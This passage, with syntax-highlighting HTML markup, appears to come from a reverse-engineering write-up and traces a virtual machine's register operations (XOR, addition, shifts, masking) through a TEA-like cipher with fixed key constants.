W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">242</span>b2f3b <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">7087</span>a5d
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7087</span>a5d <span class="token operator">^</span> <span class="token number">60</span>c85560 <span class="token operator">=</span> <span class="token number">67</span>c02f3d
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>c02f3d <span class="token operator">+</span> <span class="token number">57f</span>66134 <span class="token operator">=</span> bfb69071
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfb69071 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">5f</span>db483
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfb69071 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">2f</span>eda41c40
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5f</span>db483 <span class="token operator">^</span> eda41c40 <span class="token operator">=</span> e859a8c3
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> bfb69071 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> ae94a335
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> e859a8c3 <span class="token operator">+</span> ae94a335 <span class="token operator">=</span> <span class="token number">196</span>ee4bf8
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> bebfcdce <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> bebfcdce <span class="token operator">=</span> <span class="token number">1202</span>d2d40
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">202</span>d2d40 <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">8</span>b863f52
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">96</span>ee4bf8 <span class="token operator">^</span> <span class="token number">8</span>b863f52 <span class="token operator">=</span> <span class="token number">1</span>d6874aa
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1</span>d6874aa <span class="token operator">+</span> dbb8a417 <span class="token operator">=</span> f92118c1
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> f92118c1 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> f92118c
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f92118c1 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">7</span>c908c6080
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f92118c <span class="token operator">^</span> <span class="token number">908</span>c6080 <span class="token operator">=</span> <span class="token number">9f</span>1e710c
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> f92118c1 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> ac476f49
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9f</span>1e710c <span class="token operator">+</span> ac476f49 <span class="token operator">=</span> <span class="token number">14</span>b65e055
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1e1f</span>b4b5 <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">3</span>c3f6
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>c3f6 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> <span class="token number">1e1f</span>b4b5 <span class="token operator">=</span> <span class="token number">7f</span>8d1427
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7f</span>8d1427 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">5</span>cae4141
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5</span>cae4141 <span class="token operator">^</span> <span class="token number">4</span>b65e055 <span class="token operator">=</span> <span class="token number">17</span>cba114
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17</span>cba114 <span class="token operator">+</span> bfb69071 <span class="token operator">=</span> d7823185
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> d7823185 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">6</span>bc118c
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> d7823185 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">35e08</span>c6140
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">6</span>bc118c <span class="token operator">^</span> e08c6140 <span class="token operator">=</span> e63070cc
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> d7823185 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> c6a002c1
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> e63070cc <span class="token operator">+</span> c6a002c1 <span class="token operator">=</span> <span class="token number">1</span>acd0738d
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1e1f</span>b4b5 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">1</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">656</span>b616d <span class="token operator">+</span> <span class="token number">1e1f</span>b4b5 <span class="token operator">=</span> <span class="token number">838</span>b1622
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">838</span>b1622 <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">28200430</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> acd0738d <span class="token operator">^</span> <span class="token number">28200430</span> <span class="token operator">=</span> <span class="token number">84f</span>077bd
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">84f</span>077bd <span class="token operator">+</span> f92118c1 <span class="token operator">=</span> <span class="token number">17e11907</span>e
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7e11907</span>e <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">7e11907</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7e11907</span>e <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">3f</span>08c83f00
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7e11907</span> <span class="token operator">^</span> <span class="token number">8</span>c83f00 <span class="token operator">=</span> f292607
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7e11907</span>e <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">2</span>b77e7f6
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f292607 <span class="token operator">+</span> <span class="token number">2</span>b77e7f6 <span class="token operator">=</span> <span class="token number">3</span>aa10dfd
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7</span>d7f9b9c <span class="token operator">>></span> b <span class="token operator">=</span> faff3
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> faff3 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">3</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">74696564</span> <span class="token operator">+</span> <span class="token number">7</span>d7f9b9c <span class="token operator">=</span> f1e90100
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> f1e90100 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> d2ca5466
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> d2ca5466 <span class="token operator">^</span> <span class="token number">3</span>aa10dfd <span class="token operator">=</span> e86b599b
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> e86b599b <span class="token operator">+</span> d7823185 <span class="token operator">=</span> <span class="token number">1</span>bfed8b20
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfed8b20 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">5ff</span>6c59
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfed8b20 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">2ff</span>b62c800
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5ff</span>6c59 <span class="token operator">^</span> fb62c800 <span class="token operator">=</span> fe9da459
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> bfed8b20 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> aecfb864
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> fe9da459 <span class="token operator">+</span> aecfb864 <span class="token operator">=</span> <span class="token number">1</span>ad6d5cbd
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7</span>d7f9b9c <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">+</span> <span class="token number">7</span>d7f9b9c <span class="token operator">=</span> f4ef03ef
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> f4ef03ef <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">5f</span>4411fd
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> ad6d5cbd <span class="token operator">^</span> <span class="token number">5f</span>4411fd <span class="token operator">=</span> f2294d40
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f2294d40 <span class="token operator">+</span> <span class="token number">7e11907</span>e <span class="token operator">=</span> <span class="token number">1703</span>addbe
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">703</span>addbe <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">703</span>addb
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">703</span>addbe <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">381</span>d6edf00
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">703</span>addb <span class="token operator">^</span> <span class="token number">1</span>d6edf00 <span class="token operator">=</span> <span class="token number">1</span>a6d72db
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">703</span>addbe <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">255</span>caa36
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1</span>a6d72db <span class="token operator">+</span> <span class="token number">255</span>caa36 <span class="token operator">=</span> <span class="token number">3f</span>ca1d11
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> dcdf8283 <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">1</span>b9bf0
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1</span>b9bf0 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">+</span> dcdf8283 <span class="token operator">=</span> <span class="token number">1544</span>eead6
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">544</span>eead6 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">776</span>dbfb0
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776</span>dbfb0 <span class="token operator">^</span> <span class="token number">3f</span>ca1d11 <span class="token operator">=</span> <span class="token number">48</span>a7a2a1
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">48</span>a7a2a1 <span class="token operator">+</span> bfed8b20 <span class="token operator">=</span> <span class="token number">108952</span>dc1
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">8952</span>dc1 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">44</span>a96e
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">8952</span>dc1 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">2254</span>b7040
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">44</span>a96e <span class="token operator">^</span> <span class="token number">254</span>b7040 <span class="token operator">=</span> <span class="token number">250f</span>d92e
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">8952</span>dc1 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> <span class="token number">19</span>b71e85
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">250f</span>d92e <span class="token operator">+</span> <span class="token number">19</span>b71e85 <span class="token operator">=</span> <span class="token number">3</span>ec6f7b3
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> dcdf8283 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">3</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">74696564</span> <span class="token operator">+</span> dcdf8283 <span class="token operator">=</span> <span class="token number">15148e7</span>e7
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5148e7</span>e7 <span class="token operator">^</span> abab1212 <span class="token operator">=</span> fae3f5f5
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>ec6f7b3 <span class="token operator">^</span> fae3f5f5 <span class="token operator">=</span> c4250246
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> c4250246 <span class="token operator">+</span> <span class="token number">703</span>addbe <span class="token operator">=</span> <span class="token number">1345f</span>e004
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">345f</span>e004 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">345f</span>e00
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">345f</span>e004 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">1</span>a2ff00200
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">345f</span>e00 <span class="token operator">^</span> <span class="token number">2ff</span>00200 <span class="token operator">=</span> <span class="token number">2</span>cb5fc00
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">345f</span>e004 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">6139978</span>c
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">2</span>cb5fc00 <span class="token operator">+</span> <span class="token number">6139978</span>c <span class="token operator">=</span> <span class="token number">8</span>def938c
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>c3f696a <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">787</span>ed
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">787</span>ed <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">1</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">656</span>b616d <span class="token operator">+</span> <span class="token number">3</span>c3f696a <span class="token operator">=</span> a1aacad7
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> a1aacad7 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">82899f</span>b1
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">82899f</span>b1 <span class="token operator">^</span> <span class="token number">8</span>def938c <span class="token operator">=</span> f660c3d
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f660c3d <span class="token operator">+</span> <span class="token number">8952</span>dc1 <span class="token operator">=</span> <span class="token number">17f</span>b39fe
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17f</span>b39fe <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> bfd9cf
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17f</span>b39fe <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">5f</span>ece7f80
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfd9cf <span class="token operator">^</span> fece7f80 <span class="token operator">=</span> fe71a64f
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17f</span>b39fe <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> <span class="token number">6</span>d90aba
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> fe71a64f <span class="token operator">+</span> <span class="token number">6</span>d90aba <span class="token operator">=</span> <span class="token number">1054</span>ab109
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>c3f696a <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> <span class="token number">3</span>c3f696a <span class="token operator">=</span> <span class="token number">9</span>dacc8dc
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9</span>dacc8dc <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">3607</span>dace
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">54</span>ab109 <span class="token operator">^</span> <span class="token number">3607</span>dace <span class="token operator">=</span> <span class="token number">334</span>d6bc7
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">334</span>d6bc7 <span class="token operator">+</span> <span class="token number">345f</span>e004 <span class="token operator">=</span> <span class="token number">67</span>ad4bcb
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>ad4bcb <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">67</span>ad4bc
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>ad4bcb <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">33</span>d6a5e580
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>ad4bc <span class="token operator">^</span> d6a5e580 <span class="token operator">=</span> d0df313c
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>ad4bcb <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">32</span>cb3c43
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> d0df313c <span class="token operator">+</span> <span class="token number">32</span>cb3c43 <span class="token operator">=</span> <span class="token number">103</span>aa6d7f
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9</span>b9f5051 <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">1373</span>ea
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1373</span>ea <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> <span class="token number">9</span>b9f5051 <span class="token operator">=</span> fd0cafc3
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> fd0cafc3 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> de2ffaa5
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> de2ffaa5 <span class="token operator">^</span> <span class="token number">3</span>aa6d7f <span class="token operator">=</span> dd8597da
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> dd8597da <span class="token operator">+</span> <span class="token number">17f</span>b39fe <span class="token operator">=</span> f580d1d8
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> f580d1d8 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">7</span>ac068e
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f580d1d8 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">3</span>d60347600
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7</span>ac068e <span class="token operator">^</span> <span class="token number">60347600</span> <span class="token operator">=</span> <span class="token number">6798708</span>e
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> f580d1d8 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> e4a2e29c
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">6798708</span>e <span class="token operator">+</span> e4a2e29c <span class="token operator">=</span> <span class="token number">14</span>c3b532a
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9</span>b9f5051 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">1</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">656</span>b616d <span class="token operator">+</span> <span class="token number">9</span>b9f5051 <span class="token operator">=</span> <span class="token number">1010</span>ab1be
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">10</span>ab1be <span class="token operator">^</span> abab1212 <span class="token operator">=</span> aaa1a3ac
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4</span>c3b532a <span class="token operator">^</span> aaa1a3ac <span class="token operator">=</span> e69af086
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> e69af086 <span class="token operator">+</span> <span class="token number">67</span>ad4bcb <span class="token operator">=</span> <span class="token number">14e483</span>c51
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4e483</span>c51 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">4e483</span>c5
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4e483</span>c51 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">27241e2880</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4e483</span>c5 <span class="token operator">^</span> <span class="token number">241e2880</span> <span class="token operator">=</span> <span class="token number">20f</span>aab45
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4e483</span>c51 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">1</span>b2e4bd9
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">20f</span>aab45 <span class="token operator">+</span> <span class="token number">1</span>b2e4bd9 <span class="token operator">=</span> <span class="token number">3</span>c28f71e
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> faff3738 <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">1f</span>5fe6
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1f</span>5fe6 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
